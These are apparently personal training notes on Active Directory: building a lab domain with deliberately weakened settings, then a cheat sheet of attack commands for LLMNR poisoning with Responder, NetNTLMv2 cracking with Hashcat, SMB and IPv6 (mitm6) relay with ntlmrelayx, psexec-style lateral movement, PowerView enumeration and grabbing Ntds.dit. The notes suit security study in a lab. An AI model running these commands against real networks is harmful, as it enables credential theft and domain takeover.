# Active Directory:
Evalutation Copies of Windows for testing purposes: 
1. https://www.microsoft.com/en-us/evalcenter/
2. https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server
3. https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise

alternative resource: 
1. https://evotec.xyz/the-only-powershell-command-you-will-ever-need-to-find-out-who-did-what-in-active-directory/
2. https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#active-directory-exploitation-cheat-sheet

## Domain Controller
1. hosts a copy of AD Directory Services directory store
2. provide authentication and authorization
3. replicate updates to other domain controllers in the domain and forest
4. allow administrative access to manage user accounts and network resources

## Domains: a way to group and manage objects in an organization
1. an administrative boundary for applying policies to groups of objects
2. a replication boundary for replicating data between domain controllers
3. an authentication and authorization boundary that proveides a way to limit the scope of access to resources. 

## Forest: a collection of one or more domain trees
1. share a common schema
2. share a common configuration partition
3. share a common global catalog to enable searching
4. enable trusts between all domains in the forest
5. share the Enterprise Admins and Schema Admins groups

## Oganizational Unit (OU): OUs are Active Directory containers that can contain users, groups, computers, and other OUs
1. represent your organization hierarchically and logically
2. manage a collection of objects in a consistent way
3. delegate permissions to administer groups of objects
4. apply policies

## Trusts: provide a mechanism for users to gain access to resources in another domain
1. all domians in a forest trust all other domains in the forest
2. trust can extend outside the forest

Directional Trust: the trust direction flows from trusting domain to to trusted domain

Transitive Trust: the trust relationship is extended beyond a two-domain trust to include other trusted domains 

## Objects:
1. User: enables network resource access for a user
2. InetOrgPerson: similar to user account, used for compatibility with other directory services
3. Contacts: Used primarily to assign e-mail addresses to external users, doesn't enable network access
4. Groups: used to simplify the administration of access controls
5. Computers: Enables authentication and auditing of computer access to resources
6. Printers: Used to simplify the process of locating and connecting to printers
7. Shared Folders: enables users to search for shared folders based on properties


**********************

## Active Directory Domain Controller Setup:
1. Install server using Windows server 2019 evaluation iso
2. Rename server (reboot)
4. Install Active Directory:
  - Manage > add Roles and Features > Next > Next > Next > Active Directory Domain Services > Next ... Install
6. Promote this server to a domain controller
  - After Installation has finished, look for Yellow Flag (Post-deployment Configuration)
5. Add a New Forest > Root Domain Name: MARVEL.local (Strat0m.com or whatever domain you want) > Create Password > Next > wait for Domain name to show up then choose Next > Next (can change NTDS location if wanted) > Next > Install
  - will automatically reboot server

## Active Directory Add File Share:
Server Manager > File and Storage Service (left pane)
Shares > Tasks (drop down window) > New Share... > SMBshare Quick > Next > Share Name: HackMe > Next > Next > Create (opens up ports 139 and 445)

## Create Service Prinicple Name (SPN): kerberoasting? 
CMD (run as administrator) 
```
setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 Marvel\SQLService
setspn -T MARVEL.local -Q */*
```
## Active Directory Add Group Policy: to turn of Defender Anti-Virus
1. Group Policy Management 
2. Forest: Marvel.local > Domains > Marvel.local
3. Right click Marvel.local and select "Create a GPO in this domian, and link it here..."
  - Name the GPO: Disable Windows Defender
4. Edit the GPO
  - in Left Pane: Computer Configuration > Policies > Administrative Templates: Policy deinitions (ADM) > Windows Components > Windows Defender Antivirus
  - in right pane: Turn off Windows Defender Antivirus > Enabled > Apply

## Active Directory Add Users:
1. Server Manager > Tools > Active Directory Users and Computers 
2. Move all Built-in Security Groups to their own area
  - right click Marvel.local > New > Organizational Unit > name it: Groups
  - Marvel.local > Users 
  - select all except (Administrator and Guest) and move them to the newly greated Groups folder (note down arrow means account has been disabled)
3. right click Marvel.local > New > User (create various users with different levels of access for testing purposes, add a description that includes a password to one account)

## Setting up LDAPS:
1. Server Manager > Manage > add roles and features
2. Next > Next > Next > Active Directory Certificate Services > Next > Next > Next Check Certifcation Authority (Role Services) > Restart the destination server automatically > Yes > Install
3. Yellow Flag at top (Refresh Dashboard if needed) >  Configure Active Directory Certificate Services
4. Next > Check "Certification Authority"  > Next > Next > Next ... Valid Period set to: 99 years > Next > Next > Configure


## Windows 10 connected to Active Directory Domain Controller:
1. Install Windows 10 using evaluation iso 
2. Add User with "Domain Join Instead" (bottom left corner) 
  - This user won't matter once we are joined to the domain
4. Rename computer (reboot)
5. Add File Share (for exploitation purposes)
6. Join to Domain
  - Change DNS settings to point to Domain Controller IP 
  - Start menu > Type: Domain > Access work or school > Connect > Join this Device to a Local Active Directory Domain 
  - Domain Name: Marvel.local 
  - Use Administrator username and password
  - Skip add an account option
  - Restart Now

## Set user as local admin on Winodws 10 PC
1. Login as Administrator 
2. Right click start menu > Computer Management > Local Users and Groups > Groups > Administrators
3. check user name that you want to make admin > OK > Apply

## Windows 10 allow Network discovery
1. Open File Explorer
2. Click Network in the left Pane
3. Clcik "OK" to allowing Network discovery
4. At the top of Explorer: "Turn on network discovery and file sharing"

**********************
# Attacking:
### Data Store:
```
%SystemRoot%\NTDS\Ntds.dit
C:\Windows\NTDS\Ntds.dit
```
always check for this file and grab it. only accessible through the domian controller and contains everything in Active Directory. 


## LLMNR Poisoning: 
#### Responder:
gather hashes over the network passively 
```
sudo python /usr/share/responder/Responder.py -I eth0 -rdw -v 
```

Options:
```
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -r, --wredir          Enable answers for netbios wredir suffix queries.
                        Answering to wredir will likely break stuff on the
                        network. Default: False
  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
                        Answering to domain suffixes will likely break stuff
                        on the network. Default: False
  -f, --fingerprint     This option allows you to fingerprint a host that
                        issued an NBT-NS or LLMNR query.
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  -v, --verbose         Increase verbosity.
```
save hashses to file called hashes.txt

#### Hashcat:
using the password file rockyou.txt and the NTLM module to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```
using the password file rockyou.txt to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```

$ hashcat --help | grep SHA

```
   5500 | NetNTLMv1                                        | Network Protocols
   5500 | NetNTLMv1+ESS                                    | Network Protocols
   5600 | NetNTLMv2                                        | Network Protocols
   1000 | NTLM                                             | Operating Systems
   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
    100 | SHA1                                             | Raw Hash
  17400 | SHA3-256                                         | Raw Hash
  17500 | SHA3-384                                         | Raw Hash
  17600 | SHA3-512                                         | Raw Hash
```


##### LLMNR Poisoning Defense:
1. Disable LLMNR
2. Disable NBT-NS
3. Require Network Access Control
4. Require strong passwords (phrases) more than 14 characters


## SMB attacks: How do I get Victim to try connecting to attack machine SMB??
edit: /usr/share/responder/Responder.conf
```
SMB = Off
HTTP = Off
```
everything else stays on

#### NMAP
check for open SMB port and check for SMB signing
```
sudo nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
```
look for smb2 enabled but not required (default for desktops)

### ntmlrelayx.py
```
# ntlmrelayx.py --help
Impacket v0.9.24.dev1+20210814.5640.358fc7c - Copyright 2021 SecureAuth Corporation

usage: ntlmrelayx.py [-h] [-ts] [-debug] [-t TARGET] [-tf TARGETSFILE] [-w]
                     [-i] [-ip INTERFACE_IP] [--no-smb-server]
                     [--no-http-server] [--no-wcf-server]
                     [--smb-port SMB_PORT] [--http-port HTTP_PORT]
                     [--wcf-port WCF_PORT] [-ra] [-r SMBSERVER]
                     [-l LOOTDIR] [-of OUTPUT_FILE] [-codec CODEC]
                     [-smb2support] [-ntlmchallenge NTLMCHALLENGE] [-socks]
                     [-wh WPAD_HOST] [-wa WPAD_AUTH_NUM] [-6]
                     [--remove-mic] [--serve-image SERVE_IMAGE]
                     [-c COMMAND] [-e FILE] [--enum-local-admins]
                     [-rpc-mode {TSCH}] [-rpc-use-smb]
                     [-auth-smb [domain/]username[:password]]
                     [-hashes-smb LMHASH:NTHASH] [-rpc-smb-port {139,445}]
                     [-q QUERY] [-machine-account MACHINE_ACCOUNT]
                     [-machine-hashes LMHASH:NTHASH] [-domain DOMAIN]
                     [-remove-target] [--no-dump] [--no-da] [--no-acl]
                     [--no-validate-privs] [--escalate-user ESCALATE_USER]
                     [--add-computer [COMPUTERNAME]] [--delegate-access]
                     [--sid] [--dump-laps] [--dump-gmsa] [-k KEYWORD]
                     [-m MAILBOX] [-a] [-im IMAP_MAX]

For every connection received, this module will try to relay that
connection to specified target(s) system or the original client

Main options:
  -h, --help            show this help message and exit
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -t TARGET, --target TARGET
                        Target to relay the credentials to, can be an IP,
                        hostname or URL like domain\username@host:port
                        (domain\username and port are optional, and don't
                        forget to escape the '\'). If unspecified, it will
                        relay back to the client')
  -tf TARGETSFILE       File that contains targets by hostname or full URL,
                        one per line
  -w                    Watch the target file for changes and update target
                        list automatically (only valid with -tf)
  -i, --interactive     Launch an smbclient or LDAP console insteadof
                        executing a command after a successful relay. This
                        console will listen locally on a tcp port and can
                        be reached with for example netcat.
  -ip INTERFACE_IP, --interface-ip INTERFACE_IP
                        IP address of interface to bind SMB and HTTP
                        servers
  --smb-port SMB_PORT   Port to listen on smb server
  --http-port HTTP_PORT
                        Port to listen on http server
  --wcf-port WCF_PORT   Port to listen on wcf server
  -ra, --random         Randomize target selection
  -r SMBSERVER          Redirect HTTP requests to a file:// path on
                        SMBSERVER
  -l LOOTDIR, --lootdir LOOTDIR
                        Loot directory in which gathered loot such as SAM
                        dumps will be stored (default: current directory).
  -of OUTPUT_FILE, --output-file OUTPUT_FILE
                        base output filename for encrypted hashes. Suffixes
                        will be added for ntlm and ntlmv2
  -codec CODEC          Sets encoding used (codec) from the target's output
                        (default "utf-8"). If errors are detected, run
                        chcp.com at the target, map the result with https:/
                        /docs.python.org/3/library/codecs.html#standard-
                        encodings and then execute ntlmrelayx.py again with
                        -codec and the corresponding codec
  -smb2support          SMB2 Support
  -ntlmchallenge NTLMCHALLENGE
                        Specifies the NTLM server challenge used by the SMB
                        Server (16 hex bytes long. eg: 1122334455667788)
  -socks                Launch a SOCKS proxy for the connection relayed
  -wh WPAD_HOST, --wpad-host WPAD_HOST
                        Enable serving a WPAD file for Proxy Authentication
                        attack, setting the proxy host to the one supplied.
  -wa WPAD_AUTH_NUM, --wpad-auth-num WPAD_AUTH_NUM
                        Prompt for authentication N times for clients
                        without MS16-077 installed before serving a WPAD
                        file. (default=1)
  -6, --ipv6            Listen on both IPv6 and IPv4
  --remove-mic          Remove MIC (exploit CVE-2019-1040)
  --serve-image SERVE_IMAGE
                        local path of the image that will we returned to
                        clients
  -c COMMAND            Command to execute on target system (for SMB and
                        RPC). If not specified for SMB, hashes will be
                        dumped (secretsdump.py must be in the same
                        directory). For RPC no output will be provided.

  --no-smb-server       Disables the SMB server
  --no-http-server      Disables the HTTP server
  --no-wcf-server       Disables the WCF server

SMB client options:
  -e FILE               File to execute on the target system. If not
                        specified, hashes will be dumped (secretsdump.py
                        must be in the same directory)
  --enum-local-admins   If relayed user is not admin, attempt SAMR lookup
                        to see who is (only works pre Win 10 Anniversary)

RPC client options:
  -rpc-mode {TSCH}      Protocol to attack, only TSCH supported
  -rpc-use-smb          Relay DCE/RPC to SMB pipes
  -auth-smb [domain/]username[:password]
                        Use this credential to authenticate to SMB (low-
                        privilege account)
  -hashes-smb LMHASH:NTHASH
  -rpc-smb-port {139,445}
                        Destination port to connect to SMB

MSSQL client options:
  -q QUERY, --query QUERY
                        MSSQL query to execute(can specify multiple)

HTTP options:
  -machine-account MACHINE_ACCOUNT
                        Domain machine account to use when interacting with
                        the domain to grab a session key for signing,
                        format is domain/machine_name
  -machine-hashes LMHASH:NTHASH
                        Domain machine hashes, format is LMHASH:NTHASH
  -domain DOMAIN        Domain FQDN or IP to connect using NETLOGON
  -remove-target        Try to remove the target in the challenge message
                        (in case CVE-2019-1019 patch is not installed)

LDAP client options:
  --no-dump             Do not attempt to dump LDAP information
  --no-da               Do not attempt to add a Domain Admin
  --no-acl              Disable ACL attacks
  --no-validate-privs   Do not attempt to enumerate privileges, assume
                        permissions are granted to escalate a user via ACL
                        attacks
  --escalate-user ESCALATE_USER
                        Escalate privileges of this user instead of
                        creating a new one
  --add-computer [COMPUTERNAME]
                        Attempt to add a new computer account
  --delegate-access     Delegate access on relayed computer account to the
                        specified account
  --sid                 Use a SID to delegate access rather than an account
                        name
  --dump-laps           Attempt to dump any LAPS passwords readable by the
                        user
  --dump-gmsa           Attempt to dump any gMSA passwords readable by the
                        user

IMAP client options:
  -k KEYWORD, --keyword KEYWORD
                        IMAP keyword to search for. If not specified, will
                        search for mails containing "password"
  -m MAILBOX, --mailbox MAILBOX
                        Mailbox name to dump. Default: INBOX
  -a, --all             Instead of searching for keywords, dump all emails
  -im IMAP_MAX, --imap-max IMAP_MAX
                        Max number of emails to dump (0 = unlimited,
                        default: no limit)
```
1. installed with impacket (see pretest setup script)
 - ``` sudo docker run -it --rm "impacket:latest" ``` 
2. run while responder is running
```
ntmlrelayx.py -tf targets.txt -smb2support -i
```

```
-i interact
-e example.exe: execute example.exe
-c ls: run command ls
```
looking for it to dump SAM hashes or give you and SMB client shell for the known user. can use MSFvenom to create an executable payload and get reverse shell. or create a powershell script or CMD to run as a command to get a reverse shell or do something. 

#### connecting: requires having cracked a hash
1. can use MSFconsole to attack the tartget using exploit/windows/smb/psexec
2. if that is getting stopped by antivirus try psexec.py 
``` psexec.py <domain>.local/<user>:<password>@<ip-address> ```
3. if that is getting stopped by antivirus try smbexec.py 
``` smbexec.py <domain>.local/<user>:<password>@<ip-address> ```
4. if that is getting stopped by antivirus try wmiexec.py 
``` wmiexec.py <domain>.local/<user>:<password>@<ip-address> ```
5. there is also a powershell version of psexec and other options that might be able to do the same thing. 

## IPv6: mitm6
1. install from github
```
cd /opt; git clone https://github.com/fox-it/mitm6.git; cd mitm6
```
2. get Domain Controller IP 
Domain controllers will show port 389 running the Microsoft Windows AD LDAP service:
```
nmap -p389 -sV <IP-range>
```
Expected Output:
```
PORT    STATE SERVICE VERSION 
389/tcp open  ldap    Microsoft Windows AD LDAP (Domain:TESTDOMAIN, Site: TEST) 
```
OR:
```
nmap -p 389 -T4 -A -v --script ldap-rootdse <IP-range>
```
3. get Domain name using nmap
```
nmap --script smb-enum-domains.nse -p445 <host>
sudo nmap -sU -sS --script smb-enum-domains.nse -p U:137,T:139 <host>
```
OR:
```
nmap --script smb-os-discovery.nse -p445 127.0.0.1
sudo nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 127.0.0.1
```

4. run mitm6
```
sudo python mitm6.py -i eth0 -d <domain>.local
```

5. run ntmlrelayx.py at the same time
```
ntmlrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.<domain>.local -l lootme
```
6. check on results:
all captured info will be saved to lootme folder in the directory you ran this command. when someone logs in to a computer on the network this will try to create a user and acl for persistent access. 
```
firefox ./lootme/domain_users.html
```
Always check for passwords in the description. 

#### ntmlrelayx.py output:
```
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[-] New user already added. Refusing to add another
[-] Unable to escalate without a valid user.
[-] New user already added. Refusing to add another
[-] Unable to escalate without a valid user, aborting.
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\FRANK1$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\Administrator SUCCEED
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\FRANK1$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\Administrator SUCCEED
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: login.live.com:443
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: login.live.com:443

ACE
AceType: {0}
AceFlags: {2}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}

```

## Domain Enumeration: 
### Powerview: 
Download on to Windows Victim Machine:
1. https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

From CMD:
```
powershell -ep bypass                 # -ep   ExecutionPolicy
. .\PowerView.ps1
```
this will not show any output, you just have to have faith it is running. or try the follwoing commands.
```
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy                                  # shows the policies
(Get-DomainPolicy)."system access"                # shows the password policy for easier password cracking
Get-NetUser                                       # can pull lots of info depending on size of domain
Get-NetUser | select cn                           # will only pull usernames
Get-NetUser | select samaccountname               # will only pull usernames
Get-NetUser | select description                  # will get descriptions that may have Passwords in them
Get-UserProperty -Properties pwdlastset           # tells when each usesr password was last reset (good if you have pwnd account info)
Get-UserProperty -Properties logoncount           # 0 logons is suspicious and maybe the signs of a honeypot account
Get-UserProperty -Properties badpwdcount          # can show signs of an account that is being brute forced
Get-NetComputer                                   # will list all the computers on the domain
Get-NetComputer -FullData                         # when you want a Tsunami of information 
Get-NetComputer -FullData | select <catagory>     # Example Usage Below
Get-NetComputer -FullData | select OperatinSystem # shows all the Operating Systems on the Domain
Get-NetGroup                                      # list groups
Get-NetGroup -GroupName "Domain Admins"           # will list domain admins group
Get-NetGroup -GroupName *admin*                   # will ist all administrator groups on the domain
Get-NetGroupMember -GroupName "Domain Admins"     # Will list all administrators on the domain
Invoke-ShareFinder                                # shows all files and folders being shared on the network
Get-NetGPO                                        # shows all the Group Policies like disabled SMB signing or disabled defender
Get-NetGPO | select displayname, whenchanged
```
References:
1. https://gist.githubusercontent.com/HarmJ0y/184f9822b195c52dd50c379ed3117993/raw/e5e30c942adb2347917563ef0dafa7054882535a/PowerView-3.0-tricks.ps1

### Bloodhound: 
1. https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/
2. https://github.com/BloodHoundAD/BloodHound

Install: 
```
sudo apt install bloodhound
```
First Setup:

1. In shell: 
```
sudo neo4j console
```
2. Browse to http://localhost:7474/

Uid: neo4j

password: neo4j

3. Change Default Password

Close Browser Window

4. In shell: 
```
bloodhound
```
this will open the tool and require login. 


## Pass the hash: 


## CrackMapExec:
https://mpgn.gitbook.io/crackmapexec/

## SecretsDump.py:


## Token Impersonation:


## kerberoasting:
https://attack.mitre.org/techniques/T1558/003/

Kerberoasting is a post-exploitation attack that extracts service account credential hashes from Active Directory for offline cracking.



## GPP:


## MimiKatz:
https://github.com/gentilkiwi/mimikatz/wiki

## Golden Ticket: 





